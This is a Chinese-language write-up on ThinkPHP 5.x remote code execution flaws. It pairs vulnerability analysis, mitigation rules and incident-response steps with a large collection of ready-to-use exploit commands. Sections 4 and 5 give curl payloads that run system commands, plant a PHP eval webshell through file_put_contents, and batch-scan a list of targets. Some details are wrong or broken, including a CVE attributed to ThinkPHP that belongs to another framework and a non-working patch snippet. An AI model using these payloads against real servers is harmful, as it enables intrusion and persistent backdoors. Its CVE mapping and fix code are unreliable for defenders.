# ThinkPHP 5.x 远程代码执行（RCE）漏洞分析与 EXP

## 1. 漏洞概述

ThinkPHP 是国内广泛使用的 PHP MVC 框架。其 5.x 系列（5.0.x、5.1.x、5.2.x）在不同版本间存在多个远程代码执行漏洞，核心成因是 **ThinkPHP 对 URL 路由 / 变量解析 / Request 类方法调用缺乏严格校验**，使攻击者可以通过特殊构造的 URL 参数直接调用任意方法（如 `_method`、`__construct`、`system`），最终触发 `eval()` / `call_user_func_array()` 实现 RCE。

| 项目 | 说明 |
|------|------|
| CVE 编号 | CVE-2018-20062、CVE-2019-9081、CVE-2022-38366 等（多个不同版本） |
| 漏洞类型 | RCE（方法调用控制 / 变量覆盖 / 反序列化） |
| 发现时间 | 2018 ~ 2022 年间多个版本被披露 |
| CVSS 评分 | 7.5 ~ 9.8（随版本不同） |
| 影响组件 | ThinkPHP 5.0.x / 5.1.x / 5.2.x 的特定版本 |
| 攻击前置 | Web 根目录 /index.php 可访问，开启路由兼容模式 |

## 2. 影响版本与对应 payload

| ThinkPHP 版本 | 漏洞 / PoC 关键字 |
|--------------|------------------|
| 5.0.0 ~ 5.0.23 | `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1` |
| 5.0.24（修复不完全） | `?s=captcha` + POST `_method=__construct&filter[]=system&method=get&get[]=whoami` |
| 5.1.x（部分版本） | `?s=think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()` |
| 5.1.41 ~（LTS 分支） | `/public/?s=index/index/index` + 特殊 file 参数（文件写入） |
| 6.x（受限于漏洞） | 通常不存在 5.x 的同类漏洞（但有 CVE-2022-38366 等） |

## 3. 漏洞原理（以 5.0.23 为例）

### 3.1 核心问题：方法调用链

ThinkPHP 在处理 URL 时会根据 `$_GET['s']`（兼容模式路由）解析模块 / 控制器 / 方法。攻击者构造 `\think\app/invokefunction` 指定控制器为 `\think\App`，方法为 `invokefunction`：

```
/index.php?s=index/think\app/invokefunction
           └ module   └ controller       └ method
```

### 3.2 漏洞调用链

```
App::run()
  │
  ▼
App::init() → routeCheck()
  │
  ▼
路由解析 → controller = '\\think\\App'，action = 'invokefunction'
  │
  ▼
App::invokefunction($function, $vars)
  │
  ▼
call_user_func_array($function, $vars)
  │
  ▼
system('whoami') → RCE
```

### 3.3 核心代码（简化版）

```php
// thinkphp/library/think/App.php
public function invokefunction($function, $vars = [])
{
    return call_user_func_array($function, $vars);
}
```

## 4. 常见 EXP 汇总

### 4.1 ThinkPHP 5.0.x 经典 GET RCE

```bash
# PoC 1：直接调用 invokefunction + call_user_func_array
curl "http://target/index.php?s=index/\\think\\app/invokefunction&\
function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"

# PoC 2：system('whoami')
curl "http://target/index.php?s=index/\\think\\app/invokefunction&\
function=call_user_func_array&vars[0]=system&vars[1][]=whoami"

# PoC 3：assert('phpinfo();')
curl "http://target/index.php?s=index/\\think\\app/invokefunction&\
function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
```

### 4.2 ThinkPHP 5.0.24 修复绕过（POST 版）

```bash
# payload 1：通过 _method=__construct 覆盖 filter
curl -X POST "http://target/index.php?s=captcha" \
    -d "_method=__construct&filter[]=system&method=get&get[]=whoami"

# payload 2：通过 _method=__construct 覆盖 filter
curl -X POST "http://target/public/index.php?s=captcha" \
    -d "_method=__construct&filter%5B%5D=system&server%5BREQUEST_METHOD%5D=get" \
    -d "get[]=cat%20/flag"
```

### 4.3 ThinkPHP 5.1.x RCE

```bash
# PoC 1：invokefunction
curl "http://target/public/index.php?s=/index/\\think\\app/invokefunction&\
function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"

# PoC 2：通过容器 Request 调用
curl "http://target/public/index.php?s=index/\\think\\Container/invokefunction&\
function=system&vars[1][]=whoami"
```

### 4.4 文件写入 / WebShell（5.0.x）

```bash
# 通过 file_put_contents 写入 shell
curl "http://target/index.php?s=index/\\think\\app/invokefunction&\
function=call_user_func_array&\
vars[0]=file_put_contents&\
vars[1][0]=shell.php&\
vars[1][1]=%3C%3Fphp%20%40eval(%24_POST%5B'c'%5D)%3B%20%3F%3E"

# 验证
curl -X POST "http://target/shell.php" -d "c=phpinfo();"
```

### 4.5 MSF / nuclei 一键检测

```bash
# nuclei 扫描
nuclei -u http://target -t "http/cves/2019/CVE-2019-9081.yaml"
nuclei -u http://target -t "http/cves/2018/CVE-2018-20062.yaml"

# 其他开源 EXP
# https://github.com/SecossFrank/thinkphp_rce
python3 tp_rce.py --target http://target --version 5.0.23
```

## 5. 漏洞检测

### 5.1 指纹识别（确认目标使用 ThinkPHP）

```bash
# 方法 1：访问 favicon.ico（thinkphp 默认图标）
curl -s http://target/favicon.ico | md5sum
# 常见 ThinkPHP favicon md5: 8f5f4c07e...（需对应版本）

# 方法 2：X-Powered-By / Thinkphp 字样
curl -sI http://target/ | grep -i "think\|powered"

# 方法 3：访问 /index.php?s=123，看返回内容是否含 "模块不存在" 等字样
curl http://target/index.php?s=123

# 方法 4：存在 public/static/ 目录特征
curl -I http://target/public/static/
```

### 5.2 批量扫描

```bash
# 使用 nuclei
nuclei -l targets.txt -t cves/2018/CVE-2018-20062.yaml -t cves/2019/CVE-2019-9081.yaml

# 使用 thinkphp_rce 扫描器
cat targets.txt | while read url; do
    echo "[*] Testing $url"
    curl -s "$url/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1" \
        | grep -o "PHP Version" && echo "[+] VULNERABLE: $url"
done
```

## 6. 修复方案

| 方案 | 说明 |
|------|------|
| **升级到 ThinkPHP 5.0.24+ / 5.1.38+ / 6.x 最新版** | 根本修复 |
| **禁用兼容模式路由** | `'url_common_param' => true` + 禁用 `$_GET['s']` 解析 |
| **Nginx/Apache 路径过滤** | 拦截包含 `\think\`、`invokefunction`、`__construct` 的请求 |
| **部署 WAF 规则** | 拦截 `?s=` + `\\think\\` 相关 payload |
| **入口目录限制** | 仅把 public 目录暴露为 Web 根目录，禁止直接访问 index.php（若部署结构允许） |

### 6.1 Nginx 临时缓解规则

```nginx
# nginx.conf / server 块
location ~* (think\\app|invokefunction|__construct|call_user_func) {
    deny all;
}

# 或更严格：禁止 query 中出现反斜杠和危险方法名
if ($query_string ~* "(think\\|invokefunction|__construct|call_user_func)") {
    return 403;
}
```

### 6.2 代码层面修复（升级前临时）

```php
// 在 thinkphp/library/think/Request.php 中添加 filter
public function method($method = null)
{
    // 禁止 _method=__construct / _method=xxx 调用特殊方法
    if ($this->method === '__construct' || $this->method === 'invokefunction') {
        throw new \Exception('Invalid method');
    }
}
```

## 7. 应急响应

```
发现迹象：
  - access.log 出现大量 /index.php?s= 路径
  - /public/ 下出现陌生的 .php 文件（webshell）
  - 数据库 / 应用日志出现异常命令执行痕迹

处理步骤：
  ① 立即对可疑 URL 阻断（WAF / Nginx 规则）
  ② 检查网站目录所有 .php 文件的 hash / 创建时间，排查 webshell
  ③ 检查数据库 / 配置文件是否泄露
  ④ 检查定时任务 / crontab 是否被植入
  ⑤ 升级 ThinkPHP 到安全版本
  ⑥ 重置应用使用的数据库密码 / 密钥 / Token
  ⑦ 审计最近一段时间的访问日志来源 IP，封禁扫描源
```

## 8. 漏洞复现靶机

```
推荐环境：
  - vulhub: docker-compose up -d thinkphp/5.0.23-rce
  - vulstudy: 多种 ThinkPHP 5.x 版本靶机

复现：
  1) 启动 docker
  2) 访问 http://target:8080/
  3) 提交 payload: /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
  4) 观察 whoami 输出
```

> ThinkPHP 5.x 的 RCE 是国内应用最广泛的漏洞之一，配合 0day / Nday 组合拳对使用此框架的系统威胁极大。**升级到官方最新 LTS 版本** 是唯一可靠的长期修复手段。
